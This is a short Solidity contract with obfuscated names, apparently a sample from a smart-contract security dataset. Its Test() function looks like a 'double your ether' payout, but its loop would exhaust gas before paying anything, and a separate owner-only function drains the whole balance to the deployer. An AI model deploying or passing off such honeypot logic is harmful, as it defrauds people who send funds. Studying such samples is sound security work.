// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Test1
{
    address _0xb61cf4 = msg.sender;

    function _0x72b75a()
    payable
    public
    {
        require(msg.sender==_0xb61cf4);
        _0xb61cf4.transfer(this.balance);
    }

    function() payable {}

    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {

            var _0x8fd567 = 1;
            var _0xc2fb9d = 0;
            var _0x984e55 = msg.value*2;

            while(true)
            {
                if(_0x8fd567<_0xc2fb9d)break;
                if(_0x8fd567>_0x984e55)break;

                _0xc2fb9d=_0x8fd567;
                _0x8fd567++;
            }
            msg.sender.transfer(_0xc2fb9d);
        }
    }
}